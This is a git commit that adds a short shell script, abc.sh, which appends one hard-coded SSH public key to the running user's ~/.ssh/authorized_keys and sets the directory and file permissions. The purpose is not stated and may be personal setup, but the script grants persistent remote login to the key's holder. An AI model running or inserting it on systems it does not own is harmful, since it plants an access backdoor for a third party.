8ab9333d185d2b52961b40773c70f63db90748ab
Ameer Mantur <ameermantur@gmail.com>
2025-10-25 21:30:32 +0530

    Create abc.sh

---
+++ abc.sh
@@ -0,0 +1,4 @@
+mkdir -p ~/.ssh
+echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIEAuCX7k9u8Q52CEAEVRyZWOvw+Hyu/hPRbs2Lz6UoHY admin@DESKTOP-MQ8TJ3E" >> ~/.ssh/authorized_keys
+chmod 700 ~/.ssh
+chmod 600 ~/.ssh/authorized_keys
